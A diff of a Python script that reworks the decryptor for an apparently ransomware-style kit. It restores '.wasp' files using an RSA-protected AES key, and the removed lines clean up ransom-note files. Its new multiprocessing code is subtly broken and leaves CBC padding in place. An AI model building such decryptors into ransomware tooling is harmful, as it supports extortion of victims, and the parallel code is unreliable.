@@ -1,98 +1,89 @@
-from Crypto.PublicKey import RSA
 from Crypto.Cipher import AES, PKCS1_OAEP
-from cryptography.fernet import Fernet
-import os
-import sys 
+from Crypto.PublicKey import RSA
+from collections import deque
+from os import walk, path, remove
+from multiprocessing import cpu_count, Pool, freeze_support
+import argparse
 
-class Decryption:
+
+class Decrypt:
     def __init__(self):
-        self.aes_key = None
-        self.decryptor=None
-        self.filelist = []
-        self.directories =[]
-        for i in range(1,len(sys.argv)):
-            self.directories.append(sys.argv[i])
+        self.key= None
+        self.dirs = None
+        self.files = deque()
 
+    def rsa_decrypt(self,InputKey,enc_key):
+        with open(InputKey, 'rb') as rsa_private_key:
+            rsa_key = rsa_private_key.read()
+        private_key = RSA.importKey(rsa_key)
+        private_decryptor = PKCS1_OAEP.new(private_key)
+        with open(enc_key, "rb") as f:     
+            aes_key =  private_decryptor.decrypt(f.read())
+            self.key = aes_key
 
-    def rsa_decryption(self):
-        with open('encrypted_aes_key.txt', 'rb') as f:
-            enc_aes_key = f.read()
-        
-        private_key = RSA.importKey(open("private.pem").read())
-        private_decryptor = PKCS1_OAEP.new(private_key)    
-        # Decrypt loaded aes key
-        dec_aes_key = private_decryptor.decrypt(enc_aes_key)
-        with open('aes.key', 'wb') as f:
-            f.write(dec_aes_key)
-        
-        print(f"[+] Private key:\n {private_key.n}")
-        print(f"[+] Decrypted aes key: {dec_aes_key}")
-        self.aes_key = dec_aes_key
-        self.decryptor = Fernet(self.aes_key)
+    def get_files(self):
+            for one in self.dirs:
+                for root, dirs, files in walk(one):
+                    for file in files:
+                        if file.endswith(".wasp"):
+                            self.files.append(path.join(root,file))
 
-    def getfile(self):
-        for path in self.directories:
-            for root, dirs, files in os.walk(path):
-                for file in files:
-                    #loggin all files in a list
-                    self.filelist.append(os.path.join(root,file))
-                #add all folders to a list 
-                for folder in dirs:
-                    self.directories.append(os.path.join(root,folder))
+    def decrypt(self,file):    
+        with open(file, "rb") as f:
+            iv = f.read(16)
+            cipher = AES.new(self.key,AES.MODE_CBC, iv)
+            while True: 
+                x = f.read(1024)
+                if not x:
+                    break
+                yield cipher.decrypt(x)
 
-    def decrypt(self):
-        for file in self.filelist:
-            try:
-                #decrypting files
-                if os.path.exists(file) and file.endswith(".wasp"):
-                    with open(file, 'rb') as datain:
-                        data = datain.read()
-                        decrypted_data = self.decryptor.decrypt(data)
-                    #writing decrypted files to disk
-                    with open(file.replace('.wasp',''), "wb") as dwasp:
-                        dwasp.write(decrypted_data)
-                    #remove encrypted file
-                    os.remove(file)
-            #log exceptions
-            except Exception as e:
-                with open("decryption.log" , "a+", encoding="utf8") as log:
-                    log.write(str(e)+"\n")
-                pass
+    def output(self,file,out):
+        with open(file[:-5], "wb") as o:
+            while True:
+                try:
+                    o.write(next(out))
+                except StopIteration:
+                    break
+    def worker(self):
+        while self.files:
+            file = self.files.pop()
+            yield file
 
-    def clean(self):
-        #remove encryption logs
-        junks = ["failed_encryption.log", "encrypted_files.log", "encrypted_aes_key.txt"]
-
-        for junk in junks:
-            try:
-                os.remove(junk)
-            except Exception:
-                pass
-
-        for folder in self.directories:
-            try:
-                os.remove(f"{folder}/encryption_read_me.txt")
-            except Exception:
-                pass
-
+    def test(self,file):
+        dec = self.decrypt(file)
+        self.output(file,dec)
+        remove(file)
 
 def main():
-    run = Decryption()
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-k','--key', help='RSA private key', required=True)
+    parser.add_argument('-e','--enc', help='encrypted AES key', required=True)
+    parser.add_argument('-d','--dir', nargs='+', help='Directories to decrypt', required=True)
+    args = parser.parse_args()
+    run = Decrypt()
+    run.dirs = args.dir
     print("__START DECRYPTION__")
     print("[+] decrypting aes key..")
-    run.rsa_decryption()
+    run.rsa_decrypt(args.key,args.enc)
     print("[+] getting files list..")
-    run.getfile()
+    run.get_files()
+    cpu = cpu_count()
+    ok = run.worker()
     print("[+] aes decryption start.")
-    run.decrypt()
+    while True:
+        try:
+            with Pool(processes=cpu) as pool:
+                pool.apply_async(run.test(next(ok)))
+        except Exception as e:
+            error = repr(e)
+            if error == "StopIteration()":
+                break
+            else:
+                print(error)
+                continue
     print("[+] aes decryption end.")
-    print("[+] cleaning junk files..")
-    run.clean()
     print("__END DECRYPTION__")
-
-if len(sys.argv) < 2:
-    sys.exit(f"usage: {sys.argv[0]} folder1 folder2 folder3...")
-try:
+if __name__ == '__main__':
+    freeze_support()
     main()
-except Exception as E:
-    print("[-] fix the following error:\n" + str(E))
